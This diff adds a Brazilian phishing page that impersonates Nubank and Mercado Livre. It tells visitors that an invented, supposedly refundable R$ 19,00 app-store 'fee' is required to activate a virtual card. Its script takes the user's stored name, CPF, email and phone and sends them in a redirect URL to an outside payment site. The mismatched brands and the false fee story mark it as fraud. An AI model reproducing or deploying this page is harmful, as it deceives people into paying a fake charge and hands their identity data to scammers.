@@ -1,0 +1,235 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/up3/css/all.min.css">
+    <title>Cartão</title>
+    
+    <script src="/up3/js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+  
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=AW-17359210869"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'AW-17359210869');
+</script>
+
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Sora', sans-serif;
+            background-color: #f5f5f5;
+            text-align: center;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            border-bottom: 1px solid #a216ff;
+            background-color: #7E08CA;
+        }
+        .header img {
+            width: 80px;
+            padding: 10px;
+        }
+        .logo {
+            margin-left: 20px;
+        }
+        .content {
+            padding: 20px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        .button {
+            background-color: #7E08CA;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            border: none;
+            width: 100%;
+            font-family: 'Sora', sans-serif;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            position: relative;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(162, 50, 242, 0.7);
+            }
+            70% {
+                box-shadow: 0 0 0 10px rgba(162, 50, 242, 0);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(162, 50, 242, 0);
+            }
+        }
+        .new-content {
+            padding: 20px;
+            max-width: 600px;
+            margin: 0 auto;
+            border-radius: 8px;
+        }
+        .new-content h2 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .new-content p {
+            color: #666;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        .new-content .price {
+            font-size: 24px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 20px;
+        }
+        .new-content .download-button {
+            background-color: #7E08CA;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            border: none;
+            width: 100%;
+            font-family: 'Sora', sans-serif;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            animation: pulse 2s infinite;
+        }
+    </style>
+</head>
+<body>
+    <div id="initialContent">
+        <div class="header">
+            <img src="/up3/images/logo.png" alt="Logo Mercado Livre" class="logo">
+        </div>
+
+        <div class="content" id="initialContent">
+            <h1 style="font-size: 18px;">Quase lá, hora de ativar seu app!</h1>
+            
+            <p class="subtitle">
+                Para ativar seu aplicativo e usar seu cartão virtual, é necessário acessar na Google Play Store ou Apple Store.
+            </p>
+
+            <button onclick="ativarConta()" class="button" style="margin-bottom: 15px;">Baixar Apple Store (iPhone)</button>
+            <button onclick="ativarConta()" class="button">Baixar Google Play Store (Android)</button>
+
+            <div style="text-align: center; margin: 30px 0;">
+                <img src="/up3/images/app.webp" alt="Aplicativo Mercado Livre" style="max-width: 100%; border-radius: 10px;">
+            </div>
+        </div>
+        <div style="padding: 20px; text-align: center; margin-top: 30px; margin-bottom: 30px; border-top: 1px solid #cacaca;">
+            <p style="font-family: 'Sora', sans-serif; color: #666; font-size: 14px; margin-bottom: 15px;">
+                Nubank S.A. | CNPJ: 79.379.491.0008-50 | Rod. Antônio Heil, 250 - Centro II, Brusque - SC, 88353-100
+            </p>
+            <p style="font-family: 'Sora', sans-serif; color: #666; font-size: 14px; margin-bottom: 15px;">
+                © 2025 - Todos os direitos reservados
+            </p>
+        </div>
+    </div>
+
+    <div id="newContent" style="display: none;">
+        <div class="header">
+            <img src="/up3/images/logo.png" alt="Logo Mercado Livre" class="logo">
+        </div>
+
+        <div class="new-content">
+            <h2 style="font-size: 20px;">Perfeito! Vamos lá...</h2>
+            <p style="font-size: 14px;">No ano de 2024 as lojas de aplicativos <strong>(PlayStore e AppStore)</strong> criaram uma tarifa obrigatória para toda instituição financeira que possui atuação no Brasil, que é nosso caso. Esta tarifa tem o objetivo de inibir possíveis fraudes.</p>
+            <p style="font-size: 14px;">Nós do <strong>Nubank</strong> não achamos justo ser cobrado este valor de nossos clientes, por isso todo valor pago nesta tarifa será reembolsado na sua <strong>Conta Digital Nubank</strong>.</p>
+            
+            <div style="border: 1px solid #cacaca; padding: 5px 15px; border-radius: 8px;">
+                <p style="font-size: 14px;"><strong>Não se preocupe, este valor estará disponível na sua conta digital, assim que você baixar seu aplicativo.</strong></p>
+                <p style="font-size: 14px;">O link para baixar o App será liberado imediatamente após o pagamento.</p>
+            </div>
+
+            <div class="price" style="padding-top: 15px;">R$ 19,00</div>
+            <button class="download-button" onclick="redirectToPayment()">Quero baixar meu aplicativo</button>
+        </div>
+
+        <div style="padding: 20px; text-align: center; margin-top: 30px; margin-bottom: 30px; border-top: 1px solid #cacaca;">
+            <p style="font-family: 'Sora', sans-serif; color: #666; font-size: 14px; margin-bottom: 15px;">
+                Nubank S.A. | CNPJ: 79.379.491.0008-50 | Rod. Antônio Heil, 250 - Centro II, Brusque - SC, 88353-100
+            </p>
+            <p style="font-family: 'Sora', sans-serif; color: #666; font-size: 14px; margin-bottom: 15px;">
+                © 2025 - Todos os direitos reservados
+            </p>
+        </div>
+    </div>
+
+    
+    <script>
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        function getUTMParams() {
+            return getUrlParams();
+        }
+
+        function buildUrlWithParams(baseUrl) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl, window.location.href);
+            Object.keys(params).forEach(key => {
+                url.searchParams.append(key, params[key]);
+            });
+            
+            return url.toString();
+        }
+
+        function redirectToPaymentLegacy() {
+            try {
+                const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario')) || {};
+                const email = localStorage.getItem('email') || '';
+                const telephone = localStorage.getItem('telephone') || '';
+                
+                const baseUrl = 'https://pay.clubevantagem.site/yOeXZKxQXKqGAQa';
+                const url = new URL(baseUrl);
+                
+                // Adicionar parâmetros do usuário
+                url.searchParams.append('name', dadosUsuario.NOME || '');
+                url.searchParams.append('document', dadosUsuario.CPF || '');
+                url.searchParams.append('email', email);
+                url.searchParams.append('telephone', telephone);
+                
+                // Adicionar parâmetros da URL atual usando a função buildUrlWithParams
+                const finalUrl = buildUrlWithParams(url.toString());
+                
+                const button = document.querySelector('button');
+                button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right: 10px;"></i>Processando pagamento';
+                
+                window.location.href = finalUrl;
+            } catch(err) {
+                console.error('Erro ao redirecionar:', err);
+                    window.location.href = buildUrlWithParams('https://pay.clubevantagem.site/yOeXZKxQXKqGAQa');
+            }
+        }
+    </script>    
+
+    
+
+    <script>
+        function ativarConta() {
+            event.preventDefault();
+            document.getElementById('initialContent').remove();
+            document.getElementById('newContent').style.display = 'block';
+        }
+    </script>
+
+  <script src="/js/checkout-nu.js"></script>
+</body></html>
